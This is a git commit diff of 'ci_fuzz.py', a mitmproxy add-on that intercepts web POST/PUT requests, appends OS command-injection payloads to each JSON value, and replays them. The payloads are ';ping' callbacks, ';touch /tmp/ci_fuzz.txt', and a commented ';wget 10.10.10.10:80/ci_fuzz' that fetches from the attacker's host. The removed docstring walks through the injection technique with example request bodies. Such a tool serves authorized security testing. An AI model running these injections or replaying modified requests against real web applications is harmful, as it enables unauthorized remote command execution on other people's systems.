e960d921998d868e727756c1999d930bb309aad4
Chris Hebert <chrisdhebert@gmail.com>
2017-12-28 22:23:42 -0500

    fixed redundant documentation general cleanup

--- ci_fuzz.py
+++ ci_fuzz.py
@@ -1,74 +1,12 @@
 '''
 CI_FUZZ     v.2017-Dec-28
-
    _____ _____    ______             
   / ____|_   _|  |  ____|            
  | |      | |    | |__ _   _ ________
  | |      | |    |  __| | | |_  /_  /
  | |____ _| |_   | |  | |_| |/ / / / 
   \_____|_____|  |_|   \__,_/___/___|
-                                     
                                                 
-                                                
-Description:
-
-	This script fuzz's for Command Injection vulnerabilities resulting in remote command execution.  
-	Similiar OWASP vulnerablities are explained here --> https://www.owasp.org/index.php/Command_Injection
-	The script will attempt to execute OS commands by injecting into every value in the body of a POST/PUT.  
-	Detecting execution requires another tool such as listening for web/icmp traffic or watching a directory on the target OS, etc.
-
-	For example, if the script observes a user has performed a single POST with body set to {"webfunction": "settime", "hour": "10", "minute": "00"}
-	The script will generate 5 POST's
-	1)The original POST (as is)
-		{"webfunction": "settime", "hour": "10", "minute": "00"}	
-	2)CI injection on 1st value
-		{"webfunction": "settime;ping 10.10.10.10", "hour": "10", "minute": "00"}
-	3)CI injection on the 2nd value
-		 {"webfunction": "settime", "hour": "10;ping 10.10.10.10", "minute": "00"}
-	4)CI injection on the 3rd value
-		{"webfunction": "settime", "hour": "10", "minute": "00;ping 10.10.10.10"}
-	5)A cleanup POST to return variables to the original value
-		{"webfunction": "settime", "hour": "10", "minute": "00"}
-
-	If the payload was executed, the attacker would recieve an icmp ping packet. In this example, the web application is vulnerable to command injection/execution via setting the system time.
-
-
-Prerequisites:
-
-	-mitmproxy 3.0.0+   
-
-        	#"Virtualenv" method to run mitmproxy 3.0.0+ (ie: your distribution does not support 3.0.0+ binaries)
-        	git clone https://github.com/mitmproxy/mitmproxy.git
-
-        	#Follow the "Development setup" here -> https://github.com/mitmproxy/mitmproxy (simliar to below)
-        	apt-get install python3-venv
-        	cd mitmproxy
-        	./dev.sh
-
-        	#Confirm mitmproxy version 3.0.0+
-        	. venv/bin/activate
-        	(venv) root@kali:/usr/local/src/source-install/mitmproxy3# mitmproxy --version
-        		Mitmproxy version: 3.0.0 (2.0.0dev0920-0x3c934b1a)
-        		Python version: 3.5.4
-
-Installation:
-
-        #Download ci_fuzz.py
-        git clone https://github.com/mvdevnull/ci_fuzz.git
-
-
-Usage Examples:
-      
-  	*Set variables in the configuration section below
-                Change payload
-                Change any other variables in Configuration Section
-	*Optional - Import ~/.mitmproxy/mitmproxy-ca-cert.p12 Certificate into browser 
-
-        1)*Run mitmweb using the ci_fuzz.py script listening on localhost port 7777
-                mitmweb --listen-port 7777 --ssl-insecure -s ./ci_fuzz/ci_fuzz.py
-
-        2)*Run mitmweb using the ci_fuzz.py script same as above and upstream forward to a GUI proxy like Burp on localhost
-                mitmweb --listen-port 7777 --ssl-insecure --mode upstream:https://127.0.0.1:8080 -s ./ci_fuzz/ci_fuzz.py
 '''
 
 from mitmproxy import http    	#Request/Response intercepting
@@ -76,14 +14,13 @@ from mitmproxy import ctx    	#Logging to builtin events
 import json      		#For json manipulation
 import re			#For regex
 from time import sleep		#for delay between replays
-import socket			#For sniffing icmp/detection
-import binascii			#For sniffing and serialization
+#import socket			#For sniffing icmp/detection
+#import binascii		#For sniffing and serialization
 
 ##############################################
 #BEGIN CONFIGURATION SECTION
 #set the Command Injection payload below.  It will be added to each argument's value in the body (ie: ";ping -c 1 10.10.10.10")
-#payload = ";ping -c 1 -s 92 192.168.1.254"  #Don't forget to listen for pings on attacker's IP!! (ie: tcpdump -i eth0 icmp)
-payload = ";ping -s 14 -c 1 -p "
+payload = ";ping -s 14 -c 1 -p "  #Don't forget to run python icmp.py separately to listen for pings on attacker's IP!!
 #payload = ";touch /tmp/ci_fuzz.txt"  #Don't forget to watch for new files in the victim's directory!! (ie: watch ls /tmp/ci_fuzz.txt)
 #payload = ";wget 10.10.10.10:80/ci_fuzz --no-proxy&"   #Don't forget to setup an http listener on attacker's IP!! (ie: python -m SimpleHTTPServer 80)
 
@@ -97,7 +34,6 @@ target = socket.gethostbyname(socket.gethostname()) #Can be set to something els
 serial_int = 1   #starting serial number for tracking
 #END CONFIGURATION SECTION
 ##############################################
-#ctx.log.error("DEBUG: IP address to attempt ping injection ->%s" % (target))
 
 '''
 #BUG TODO  This part is theory to listen for ping back and get the "serial" number back. probably needs threading,etc
@@ -139,12 +75,14 @@ def modify_list(webapp_content_json_list,flow):    #BROKEN Function
 
 
 def modify_dict(webapp_content_json_dict,flow):
+    global serial_int #TODO  make sure this is properly "shared" between types
     #ctx.log.error("DEBUG5.0-MODIFY_DICT-CONTINUE-modifing dict")
     for attribute, value in webapp_content_json_dict.items():
         #ctx.log.error("DEBUG5.1-MODIFY_DICT-Continue-")
         if isinstance (value, (str)):
           value_new = str(value)
-          value_new += payload
+          value_new += payload + serial_hex + " " + target
+          serial_int += 1
           webapp_content_json_dict[(attribute)] = value_new
           send_modified_dict_request(webapp_content_json_dict,flow)
           webapp_content_json_dict[(attribute)] = value
